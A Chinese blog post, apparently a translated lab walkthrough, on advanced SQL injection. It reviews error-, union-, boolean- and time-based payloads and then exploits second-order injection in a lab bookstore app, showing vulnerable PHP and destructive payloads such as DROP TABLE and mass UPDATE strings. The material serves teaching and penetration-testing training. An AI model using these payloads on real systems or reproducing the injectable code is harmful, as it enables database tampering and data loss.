<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="简介SQL 注入仍然是 Web 应用程序最严重和最广泛的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力，导致未经授权访问数据库、数据泄露、数据操纵，甚至完全控制应用程序时，就会出现这种威胁。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击向量和缓解策略。   在这个房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和">
<meta property="og:type" content="article">
<meta property="og:title" content="高级 SQL 注入">
<meta property="og:url" content="https://imli.ink/2024/12/07/advancedsqlinjection/index.html">
<meta property="og:site_name" content="安全杂谈 | 网络安全、渗透测试、信息安全技术分享">
<meta property="og:description" content="简介SQL 注入仍然是 Web 应用程序最严重和最广泛的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力，导致未经授权访问数据库、数据泄露、数据操纵，甚至完全控制应用程序时，就会出现这种威胁。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击向量和缓解策略。   在这个房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165257.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165327.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165337.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165346.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165415.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165435.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165655.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165703.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165809.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165822.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207165929.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207170002.png">
<meta property="article:published_time" content="2024-12-07T08:17:45.317Z">
<meta property="article:modified_time" content="2024-12-07T08:17:45.317Z">
<meta property="article:author" content="Leon">
<meta property="article:tag" content="靶场">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>高级 SQL 注入</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-3YLDTM3C61"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-3YLDTM3C61');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="安全杂谈 | 网络安全、渗透测试、信息安全技术分享" type="application/atom+xml" />
    
	<!-- mathjax -->
	
  
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/sites/">站点</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/12/04/ra/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/12/07/advancedsqlinjection/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/12/07/advancedsqlinjection/&text=高级 SQL 注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/12/07/advancedsqlinjection/&is_video=false&description=高级 SQL 注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=高级 SQL 注入&body=Check out this article: https://imli.ink/2024/12/07/advancedsqlinjection/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/12/07/advancedsqlinjection/&title=高级 SQL 注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/12/07/advancedsqlinjection/&name=高级 SQL 注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/12/07/advancedsqlinjection/&t=高级 SQL 注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%86%85-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">带内 SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A8%E7%90%86%EF%BC%88%E7%9B%B2%E7%9B%AE%EF%BC%89SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">推理（盲目）SQL 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">带外 SQL 注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E9%98%B6-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二阶 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Filter-Evasion-%E6%8A%80%E6%9C%AF"><span class="toc-number">3.</span> <span class="toc-text">Filter Evasion 技术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-SQL-%E6%B3%A8%E5%85%A5-1"><span class="toc-number">4.</span> <span class="toc-text">带外 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">高级 SQL 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">6.</span> <span class="toc-text">最佳实践</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        高级 SQL 注入
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Leon</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-07T08:17:45.317Z" class="dt-published" itemprop="datePublished">2024-12-07</time>
        
        (Updated: <time datetime="2024-12-07T08:17:45.317Z" class="dt-updated" itemprop="dateModified">2024-12-07</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
</blockquote>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL 注入仍然是 Web 应用程序最严重和最广泛的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力，导致未经授权访问数据库、数据泄露、数据操纵，甚至完全控制应用程序时，就会出现这种威胁。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击向量和缓解策略。  </p>
<p>在这个房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和利用这些漏洞的技能，并实施强大的防御措施来保护您的应用程序。  </p>
<p>学习目标</p>
<p>在整个课程中，您将全面了解以下关键概念：</p>
<ul>
<li><p>二阶 SQL 注入  </p>
</li>
<li><p>过滤器规避</p>
</li>
<li><p>带外 SQL 注入</p>
</li>
<li><p>自动化技术</p>
</li>
<li><p>缓解措施</p>
</li>
</ul>
<p>我们介绍了基本技术，例如基于错误和基于联合的 SQL 注入，以及盲目 SQL 注入方法，例如基于布尔值和基于时间的攻击。以下是对 SQL 注入核心基本类型的房间的快速回顾<br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png" alt="image.png"></a></p>
<h2 id="带内-SQL-注入"><a href="#带内-SQL-注入" class="headerlink" title="带内 SQL 注入"></a>带内 SQL 注入</h2><p>这种技术被认为是最常见和最直接的 SQL 注入攻击类型。在这种技术中，攻击者使用相同的通信通道进行数据的注入和检索。带内 SQL 注入有两种主要类型：  </p>
<ul>
<li><strong>基于错误的 SQL 注入</strong>：攻击者操纵 SQL 查询以从数据库生成错误消息。这些错误消息通常包含有关数据库结构的信息，可用于进一步利用数据库。示例： .如果在错误消息中返回数据库版本，则会显示有关数据库的信息。<code>SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))</code></li>
<li><strong>基于 Union 的 SQL 注入</strong>：攻击者使用 UNION SQL 运算符将两个或多个 SELECT 语句的结果合并为一个结果，从而从其他表中检索数据。示例： .<code>SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin</code></li>
</ul>
<h2 id="推理（盲目）SQL-注入"><a href="#推理（盲目）SQL-注入" class="headerlink" title="推理（盲目）SQL 注入"></a>推理（盲目）SQL 注入</h2><p>推理 SQL 注入不会直接通过 Web 应用程序传输数据，这使得利用它更具挑战性。相反，攻击者会发送有效负载并观察应用程序的行为和响应时间，以推断有关数据库的信息。推理 SQL 注入有两种主要类型：  </p>
<ul>
<li><strong>基于布尔值的盲目 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，迫使应用程序根据 true 或 false 条件返回不同的结果。通过分析应用程序的响应，攻击者可以推断有效负载是 true 还是 false。示例： . 如果页面内容或行为根据条件发生变化，攻击者可以推断结果。<code>SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)</code></li>
<li><strong>基于时间的盲目 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，如果条件为 true，则延迟响应指定时间。通过测量响应时间，攻击者可以推断条件是 true 还是 false。例如，.如果响应延迟 5 秒，攻击者可以推断出条件为 true。<code>SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY &#39;00:00:05&#39;--</code></li>
</ul>
<h2 id="带外-SQL-注入"><a href="#带外-SQL-注入" class="headerlink" title="带外 SQL 注入"></a>带外 SQL 注入</h2><p>当攻击者无法使用相同的通道发起攻击并收集结果，或者服务器响应不稳定时，会使用带外 SQL 注入。该技术依赖于数据库服务器发出带外请求（例如 HTTP 或 DNS）以将查询结果发送给攻击者。HTTP 通常用于带外 SQL 注入，以将查询结果发送到攻击者的服务器。 我们将在这个房间里详细讨论它。</p>
<p>每种类型的 SQL 注入技术都有其优点和挑战。了解这些技术对于识别和缓解 Web 应用程序中的 SQL 注入漏洞至关重要。带内 SQL 注入易于利用和检测，但噪音很大，很容易被监控。推理（盲）SQL 注入更难利用，需要多个请求，但可以在详细错误消息不可用时使用。带外 SQL 注入不太常见且非常有效，需要外部服务器控制，并且依赖于数据库发出带外请求的能力。通过掌握这些技术，渗透测试人员可以有效地识别和利用 SQL 注入漏洞，帮助组织保护其 Web 应用程序免受这些关键威胁。</p>
<h1 id="二阶-SQL-注入"><a href="#二阶-SQL-注入" class="headerlink" title="二阶 SQL 注入"></a>二阶 SQL 注入</h1><p>二阶 SQL 注入（也称为存储 SQL 注入）利用了以下漏洞：用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入，因此名称为 “<strong>Second Order</strong>”。<br>⚠️upload failed, check dev console<br>冲击</p>
<p>Second-Order SQL Injection 的危险在于它能够绕过典型的前端防御，例如基本输入验证或清理，这些防御仅发生在初始数据输入时。由于有效载荷在第一步不会造成中断，因此可以忽略它，直到为时已晚，从而使攻击特别隐蔽。  </p>
<p><strong>示例</strong><br>：我们将使用书评应用程序。该应用程序允许用户通过网页 （） 添加新书籍。系统会提示用户提供有关他们希望添加到数据库的书籍的详细信息。您可以通过 <a target="_blank" rel="noopener" href="http://10.10.164.79/case1.">访问该应用程序。</a>收集的数据包括 、 和 。让我们考虑添加一本具有以下详细信息的书：<strong>SSN：UI00012</strong>，<strong>书名：Intro to PHP</strong>，<strong>作者：Tim</strong>。此信息通过页面上的表单输入，提交后，将存储在 <strong>BookStore</strong> 数据库中，如下所示：<code>add.php``http://10.10.164.79/second/add.php``SSN``book_name``author``add.php</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png" alt="image.png"></a><br>正如我们所知，二阶 SQL 注入的识别非常具有挑战性。与利用实时处理漏洞的传统 SQL 注入不同，当以前存储在数据库中的数据稍后用于 SQL 查询时，就会发生这种情况。检测此漏洞通常需要了解数据如何流经应用程序并重复使用，因此需要深入了解后端操作。  </p>
<p><strong>代码分析</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ssn&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$book_name</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;book_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$author</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO books (ssn, book_name, author) VALUES (&#x27;<span class="subst">$ssn</span>&#x27;, &#x27;<span class="subst">$book_name</span>&#x27;, &#x27;<span class="subst">$author</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-green-500&#x27;&gt;New book added successfully&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-red-500&#x27;&gt;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码使用该方法对输入中的特殊字符进行转义。虽然此方法可以通过转义单引号和其他 SQL 元字符来降低立即 SQL 注入的一些风险，但它并不能保护应用程序免受二阶 SQLi 的攻击。这里的关键问题是缺少参数化查询，这对于防止 SQL 注入攻击至关重要。使用该方法插入数据时，它可能包含不会立即造成伤害但可以在后续检索时激活并在另一个 SQL 查询中使用的有效负载字符。例如，插入名称为 like 的书籍可能不会影响 <strong>INSERT</strong> 操作，但如果稍后在另一个 SQL 上下文中使用书籍名称而没有正确处理，则可能会产生严重影响。<code>real_escape_string()``real_escape_string()``Intro to PHP&#39;; DROP TABLE books;--</code></p>
<p>让我们尝试添加另一本 SSN 为 的书籍。<code>test&#39;</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png" alt="image.png"></a></p>
<p>好了，SSN 已成功插入到数据库中。该应用程序包括通过类似 的界面更新书籍详细信息的功能。此界面可能会在可编辑的表单字段中显示现有书籍详细信息，根据以前存储的数据进行检索，然后根据用户输入对其进行更新。渗透测试人员将调查应用程序是否重用了以前存储且可能受污染的数据（例如 ）。然后，他将构建 SQL 查询，以使用这些可能受污染的数据更新记录，而无需进行适当的清理或参数化。通过操纵更新功能，测试人员可以查看在插入阶段添加的恶意负载是否在更新操作期间被执行。如果应用程序在此阶段未能采用适当的安全措施，则可能会激活早期注入的有效负载，从而导致执行有害的 SQL 命令，例如删除表。您可以访问该页面以更新任何图书详情。<code>test&#39;``update.php``book_name``&#39;; DROP TABLE books; --``http://10.10.164.79/second/update.php</code></p>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png" alt="image.png"></a><br>现在，让我们回顾一下代码。PHP 脚本允许用户更新 <strong>BookStore</strong> 数据库中的书籍详细信息。通过查询结构，我们将分析渗透测试人员可能寻找 SQL 注入漏洞的典型场景，特别关注在 SQL 查询中如何处理和利用用户输入。<code>update.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>];</span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ssn_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_book_name_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_author_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$update_sql</span> = <span class="string">&quot;UPDATE books SET book_name = &#x27;<span class="subst">$new_book_name</span>&#x27;, author = &#x27;<span class="subst">$new_author</span>&#x27; WHERE ssn = &#x27;<span class="subst">$ssn</span>&#x27;; INSERT INTO logs (page) VALUES (&#x27;update.php&#x27;);&quot;</span>;</span><br><span class="line">..</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>该脚本首先检查请求方法是否为 POST，以及是否按下了更新按钮，这表示用户打算更新书籍的详细信息。在此之后，该脚本直接从 POST 数据中检索用户输入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>];</span><br><span class="line"><span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ssn_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_book_name_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"><span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_author_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br></pre></td></tr></table></figure>

<p>然后，这些变量 （） 用于构造 SQL 查询，以更新数据库中指定书籍的详细信息：<code>ssn, new_book_name, new_author</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$update_sql</span> = <span class="string">&quot;UPDATE books SET book_name = &#x27;<span class="subst">$new_book_name</span>&#x27;, author = &#x27;<span class="subst">$new_author</span>&#x27; WHERE ssn = &#x27;<span class="subst">$ssn</span>&#x27;; INSERT INTO logs (page) VALUES (&#x27;update.php&#x27;);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>该脚本用于执行多个查询。它还将日志插入日志表中以进行分析。<code>multi_query</code>  </p>
<p>准备 Payload</p>
<p>我们知道，我们可以根据他们的 .更新书籍的常规查询可能如下所示：<code>ssn</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">&#x27;$new_book_name&#x27;</span>, author = <span class="string">&#x27;$new_author&#x27;</span> WHERE ssn = <span class="string">&#x27;123123&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是，如果攻击者插入特别构建的值，则 SQL 命令可能纵。例如，如果攻击者使用值：<code>ssn``ssn</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12345</span><span class="string">&#x27;; UPDATE books SET book_name = &#x27;</span>Hacked<span class="string">&#x27;; --</span></span><br></pre></td></tr></table></figure>

<p>在 update 查询中使用此值时，它会有效地结束初始 update 命令并启动新命令。这会将 books 表中所有条目的 更改为 <strong>Hacked</strong>。<code>12345``book_name</code>  </p>
<p><strong>让我们这样做</strong></p>
<ul>
<li><strong>Initial Payload Insertion</strong>：添加一本新书籍，并将有效负载作为 .分号 （） 将用于终止当前 SQL 语句。<code>12345&#39;; UPDATE books SET book_name = &#39;Hacked&#39;; --``ssn``;</code></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163303.png" alt="image.png"></a></p>
<ul>
<li><strong>恶意 SQL 执行</strong>：之后，当管理员或任何其他用户访问 URL 并更新书籍时，插入的有效负载会跳出预期的 SQL 命令结构并注入一个新命令，该命令会更新 books 表中的所有记录。让我们访问页面 ，将书名更新为任何内容，然后单击 <strong>更新</strong> 按钮。该代码将在后端执行以下语句。<code>http://10.10.164.79/second/update.php``http://10.10.164.79/second/update.php page</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE books SET book_name = <span class="string">&#x27;Testing&#x27;</span>, author = <span class="string">&#x27;Hacker&#x27;</span> WHERE ssn = <span class="string">&#x27;12345&#x27;</span>; Update books set book_name =<span class="string">&quot;hacked&quot;</span>; --<span class="string">&#x27;; INSERT INTO logs (page) VALUES (&#x27;</span>update.php<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>注释掉其余部分</strong>：双破折号 （） 是一个 SQL 注释符号。SQL Server 将忽略以下任何内容，从而有效地消除原始 SQL 语句中可能导致错误或揭示攻击的任何剩余部分。执行上述查询后，它会将所有书籍的名称更改为 <strong>hacked</strong>，如下所示：<code>--``--</code><br><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163314.png" alt="image.png"></a></li>
</ul>
<p>在本任务中，我们通过易受攻击的书评 Web 应用程序探索了二阶 SQL 注入概念。作为渗透测试人员，检查用户输入如何存储以及随后在 SQL 查询中使用至关重要。这包括验证所有形式的数据处理是否针对此类漏洞都是安全的，强调全面测试和安全实践知识的重要性，以防止注入威胁。</p>
